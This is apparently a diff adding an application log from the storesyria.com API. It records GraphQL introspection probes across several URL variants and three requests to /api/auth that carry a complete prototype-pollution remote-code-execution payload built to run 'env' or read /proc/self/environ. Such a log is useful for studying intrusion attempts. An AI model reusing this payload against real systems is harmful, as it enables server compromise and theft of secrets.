@@ -1,0 +1,269 @@
+[2026-10-06 00:07:26] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 00:07:26] local.INFO: API URL  
+[2026-10-06 00:07:26] local.INFO: http://storesyria.com/api/graphql  
+[2026-10-06 00:07:26] local.INFO: request  
+[2026-10-06 00:07:26] local.INFO: array (
+  'query' => 'query IntrospectionQuery{__schema{queryType{name} types{name} directives{name}}}',
+)  
+[2026-10-06 00:07:26] local.INFO: 
+  
+[2026-10-06 00:07:26] local.INFO: response  
+[2026-10-06 00:07:26] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 00:07:26 GMT
+Phpdebugbar-Id:              01M478JR81GHPQZ6H5M5EP5HFG
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"http:\/\/storesyria.com\/api\/graphql","image_url":"http:\/\/storesyria.com\/","payment_url":"http:\/\/storesyria.com"}}  
+[2026-10-06 00:07:26] local.INFO:  *********************************** API END ***********************************   
+[2026-10-06 00:07:27] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 00:07:27] local.INFO: API URL  
+[2026-10-06 00:07:27] local.INFO: http://www.storesyria.com/api/graphql  
+[2026-10-06 00:07:27] local.INFO: request  
+[2026-10-06 00:07:27] local.INFO: array (
+  'query' => 'query IntrospectionQuery{__schema{queryType{name} types{name} directives{name}}}',
+)  
+[2026-10-06 00:07:27] local.INFO: 
+  
+[2026-10-06 00:07:27] local.INFO: response  
+[2026-10-06 00:07:27] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 00:07:27 GMT
+Phpdebugbar-Id:              01M478JRZW9JXKV1S5MQS2HGZ0
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"http:\/\/www.storesyria.com\/api\/graphql","image_url":"http:\/\/www.storesyria.com\/","payment_url":"http:\/\/www.storesyria.com"}}  
+[2026-10-06 00:07:27] local.INFO:  *********************************** API END ***********************************   
+[2026-10-06 00:07:28] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 00:07:28] local.INFO: API URL  
+[2026-10-06 00:07:28] local.INFO: https://storesyria.com/api/graphql  
+[2026-10-06 00:07:28] local.INFO: request  
+[2026-10-06 00:07:28] local.INFO: array (
+  'query' => 'query IntrospectionQuery{__schema{queryType{name} types{name} directives{name}}}',
+)  
+[2026-10-06 00:07:28] local.INFO: 
+  
+[2026-10-06 00:07:28] local.INFO: response  
+[2026-10-06 00:07:28] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 00:07:28 GMT
+Phpdebugbar-Id:              01M478JSKNKEKSEY418DN4M8GV
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"https:\/\/storesyria.com\/api\/graphql","image_url":"https:\/\/storesyria.com\/","payment_url":"https:\/\/storesyria.com"}}  
+[2026-10-06 00:07:28] local.INFO:  *********************************** API END ***********************************   
+[2026-10-06 00:07:29] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 00:07:29] local.INFO: API URL  
+[2026-10-06 00:07:29] local.INFO: https://www.storesyria.com/api/graphql  
+[2026-10-06 00:07:29] local.INFO: request  
+[2026-10-06 00:07:29] local.INFO: array (
+  'query' => 'query IntrospectionQuery{__schema{queryType{name} types{name} directives{name}}}',
+)  
+[2026-10-06 00:07:29] local.INFO: 
+  
+[2026-10-06 00:07:29] local.INFO: response  
+[2026-10-06 00:07:29] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 00:07:29 GMT
+Phpdebugbar-Id:              01M478JTR9Q02KXH3Q80NZJ04G
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"https:\/\/www.storesyria.com\/api\/graphql","image_url":"https:\/\/www.storesyria.com\/","payment_url":"https:\/\/www.storesyria.com"}}  
+[2026-10-06 00:07:29] local.INFO:  *********************************** API END ***********************************   
+[2026-10-06 00:07:35] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 00:07:35] local.INFO: API URL  
+[2026-10-06 00:07:35] local.INFO: http://storesyria.com/api/gql  
+[2026-10-06 00:07:35] local.INFO: request  
+[2026-10-06 00:07:35] local.INFO: array (
+  'query' => 'query IntrospectionQuery{__schema{queryType{name} types{name} directives{name}}}',
+)  
+[2026-10-06 00:07:35] local.INFO: 
+  
+[2026-10-06 00:07:35] local.INFO: response  
+[2026-10-06 00:07:35] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 00:07:35 GMT
+Phpdebugbar-Id:              01M478K0YZNPV4TJQDPCSQGXYG
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"http:\/\/storesyria.com\/api\/gql","image_url":"http:\/\/storesyria.com\/","payment_url":"http:\/\/storesyria.com"}}  
+[2026-10-06 00:07:35] local.INFO:  *********************************** API END ***********************************   
+[2026-10-06 00:07:36] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 00:07:36] local.INFO: API URL  
+[2026-10-06 00:07:36] local.INFO: http://www.storesyria.com/api/gql  
+[2026-10-06 00:07:36] local.INFO: request  
+[2026-10-06 00:07:36] local.INFO: array (
+  'query' => 'query IntrospectionQuery{__schema{queryType{name} types{name} directives{name}}}',
+)  
+[2026-10-06 00:07:36] local.INFO: 
+  
+[2026-10-06 00:07:36] local.INFO: response  
+[2026-10-06 00:07:36] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 00:07:36 GMT
+Phpdebugbar-Id:              01M478K1CW2PXTDPTTE1BRZNDC
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"http:\/\/www.storesyria.com\/api\/gql","image_url":"http:\/\/www.storesyria.com\/","payment_url":"http:\/\/www.storesyria.com"}}  
+[2026-10-06 00:07:36] local.INFO:  *********************************** API END ***********************************   
+[2026-10-06 00:07:36] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 00:07:36] local.INFO: API URL  
+[2026-10-06 00:07:36] local.INFO: https://storesyria.com/api/gql  
+[2026-10-06 00:07:36] local.INFO: request  
+[2026-10-06 00:07:36] local.INFO: array (
+  'query' => 'query IntrospectionQuery{__schema{queryType{name} types{name} directives{name}}}',
+)  
+[2026-10-06 00:07:36] local.INFO: 
+  
+[2026-10-06 00:07:36] local.INFO: response  
+[2026-10-06 00:07:36] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 00:07:36 GMT
+Phpdebugbar-Id:              01M478K1KXP7F1CV2NBV7YYHGB
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"https:\/\/storesyria.com\/api\/gql","image_url":"https:\/\/storesyria.com\/","payment_url":"https:\/\/storesyria.com"}}  
+[2026-10-06 00:07:36] local.INFO:  *********************************** API END ***********************************   
+[2026-10-06 00:07:39] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 00:07:39] local.INFO: API URL  
+[2026-10-06 00:07:39] local.INFO: https://www.storesyria.com/api/gql  
+[2026-10-06 00:07:39] local.INFO: request  
+[2026-10-06 00:07:39] local.INFO: array (
+  'query' => 'query IntrospectionQuery{__schema{queryType{name} types{name} directives{name}}}',
+)  
+[2026-10-06 00:07:39] local.INFO: 
+  
+[2026-10-06 00:07:39] local.INFO: response  
+[2026-10-06 00:07:39] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 00:07:39 GMT
+Phpdebugbar-Id:              01M478K4S03H7GFGESADZAGBY6
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"https:\/\/www.storesyria.com\/api\/gql","image_url":"https:\/\/www.storesyria.com\/","payment_url":"https:\/\/www.storesyria.com"}}  
+[2026-10-06 00:07:39] local.INFO:  *********************************** API END ***********************************   
+[2026-10-06 13:26:22] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 13:26:22] local.INFO: API URL  
+[2026-10-06 13:26:22] local.INFO: https://storesyria.com/api/graphql  
+[2026-10-06 13:26:22] local.INFO: request  
+[2026-10-06 13:26:22] local.INFO: array (
+  'query' => '{ __schema { types { name fields { name args { name defaultValue } } } } }',
+)  
+[2026-10-06 13:26:22] local.INFO: 
+  
+[2026-10-06 13:26:22] local.INFO: response  
+[2026-10-06 13:26:22] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 13:26:22 GMT
+Phpdebugbar-Id:              01M48P9M4JQK0ZFDZ46EWNMG7D
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"https:\/\/storesyria.com\/api\/graphql","image_url":"https:\/\/storesyria.com\/","payment_url":"https:\/\/storesyria.com"}}  
+[2026-10-06 13:26:22] local.INFO:  *********************************** API END ***********************************   
+[2026-10-06 13:26:33] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 13:26:33] local.INFO: API URL  
+[2026-10-06 13:26:33] local.INFO: https://storesyria.com/api/auth  
+[2026-10-06 13:26:33] local.INFO: request  
+[2026-10-06 13:26:33] local.INFO: array (
+  0 => '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require(\'child_process\').execSync(\'env 2>/dev/null || cat /proc/self/environ 2>/dev/null\');","_formData":{"get":"$1:constructor:constructor"}}}',
+  1 => '"$@0"',
+)  
+[2026-10-06 13:26:33] local.INFO: 
+  
+[2026-10-06 13:26:33] local.INFO: response  
+[2026-10-06 13:26:33] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 13:26:33 GMT
+Phpdebugbar-Id:              01M48P9Z5AX90ZGRRNYF296HYB
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"https:\/\/storesyria.com\/api\/auth","image_url":"https:\/\/storesyria.com\/","payment_url":"https:\/\/storesyria.com"}}  
+[2026-10-06 13:26:33] local.INFO:  *********************************** API END ***********************************   
+[2026-10-06 13:28:44] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 13:28:44] local.INFO: API URL  
+[2026-10-06 13:28:44] local.INFO: https://storesyria.com/api/graphql  
+[2026-10-06 13:28:44] local.INFO: request  
+[2026-10-06 13:28:44] local.INFO: array (
+  'query' => '{ __schema { types { name fields { name args { name defaultValue } } } } }',
+)  
+[2026-10-06 13:28:44] local.INFO: 
+  
+[2026-10-06 13:28:44] local.INFO: response  
+[2026-10-06 13:28:44] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 13:28:44 GMT
+Phpdebugbar-Id:              01M48PDZBAR208TZ7V3YHW1HPB
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"https:\/\/storesyria.com\/api\/graphql","image_url":"https:\/\/storesyria.com\/","payment_url":"https:\/\/storesyria.com"}}  
+[2026-10-06 13:28:44] local.INFO:  *********************************** API END ***********************************   
+[2026-10-06 13:29:00] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 13:29:00] local.INFO: API URL  
+[2026-10-06 13:29:00] local.INFO: https://storesyria.com/api/auth  
+[2026-10-06 13:29:00] local.INFO: request  
+[2026-10-06 13:29:00] local.INFO: array (
+  0 => '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require(\'child_process\').execSync(\'env 2>/dev/null || cat /proc/self/environ 2>/dev/null\');","_formData":{"get":"$1:constructor:constructor"}}}',
+  1 => '"$@0"',
+)  
+[2026-10-06 13:29:00] local.INFO: 
+  
+[2026-10-06 13:29:00] local.INFO: response  
+[2026-10-06 13:29:00] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 13:29:00 GMT
+Phpdebugbar-Id:              01M48PEF6ZD4459CTNMB94F12W
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"https:\/\/storesyria.com\/api\/auth","image_url":"https:\/\/storesyria.com\/","payment_url":"https:\/\/storesyria.com"}}  
+[2026-10-06 13:29:00] local.INFO:  *********************************** API END ***********************************   
+[2026-10-06 13:36:47] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 13:36:47] local.INFO: API URL  
+[2026-10-06 13:36:47] local.INFO: https://storesyria.com/api/graphql  
+[2026-10-06 13:36:47] local.INFO: request  
+[2026-10-06 13:36:47] local.INFO: array (
+  'query' => '{ __schema { types { name fields { name args { name defaultValue } } } } }',
+)  
+[2026-10-06 13:36:47] local.INFO: 
+  
+[2026-10-06 13:36:47] local.INFO: response  
+[2026-10-06 13:36:47] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 13:36:47 GMT
+Phpdebugbar-Id:              01M48PWPT23CPVE4H9E9TAQTM7
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"https:\/\/storesyria.com\/api\/graphql","image_url":"https:\/\/storesyria.com\/","payment_url":"https:\/\/storesyria.com"}}  
+[2026-10-06 13:36:47] local.INFO:  *********************************** API END ***********************************   
+[2026-10-06 13:37:05] local.INFO:  *********************************** API START ***********************************   
+[2026-10-06 13:37:05] local.INFO: API URL  
+[2026-10-06 13:37:05] local.INFO: https://storesyria.com/api/auth  
+[2026-10-06 13:37:05] local.INFO: request  
+[2026-10-06 13:37:05] local.INFO: array (
+  0 => '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require(\'child_process\').execSync(\'env 2>/dev/null || cat /proc/self/environ 2>/dev/null\');","_formData":{"get":"$1:constructor:constructor"}}}',
+  1 => '"$@0"',
+)  
+[2026-10-06 13:37:05] local.INFO: 
+  
+[2026-10-06 13:37:05] local.INFO: response  
+[2026-10-06 13:37:05] local.INFO: HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Cache-Control:               no-cache, private
+Content-Type:                application/json
+Date:                        Tue, 06 Oct 2026 13:37:05 GMT
+Phpdebugbar-Id:              01M48PX886R8BAAJCPTGPK0FBB
+
+{"max_price":0,"status":1,"message":"Base url get successfully.","data":{"base_url":"https:\/\/storesyria.com\/api\/auth","image_url":"https:\/\/storesyria.com\/","payment_url":"https:\/\/storesyria.com"}}  
+[2026-10-06 13:37:05] local.INFO:  *********************************** API END ***********************************   
